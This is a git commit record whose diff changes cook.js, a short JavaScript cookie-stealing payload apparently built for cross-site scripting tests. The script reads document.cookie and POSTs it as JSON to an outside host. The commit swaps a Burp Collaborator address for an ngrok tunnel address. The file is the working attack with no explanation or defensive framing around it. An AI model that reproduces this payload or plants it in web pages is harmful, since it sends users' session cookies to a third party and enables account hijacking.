0b6f576b18485f5bdc145e15d950771e504a8b8a
dbr1t <75198269+dbr1t@users.noreply.github.com>
2021-05-08 17:08:15 +0000

    Update cook.js

--- cook.js
+++ cook.js
@@ -1,5 +1,5 @@
 var xhr = new XMLHttpRequest();
-xhr.open("POST", "https://0de2gubmnz9rh8sf1qp79shrvi18px.burpcollaborator.net", true);
+xhr.open("POST", "https://726f26fb1d8e.ngrok.io", true);
 xhr.setRequestHeader('Content-Type', 'application/json');
 xhr.send(JSON.stringify({ value: document.cookie }));
 alert(document.cookie);
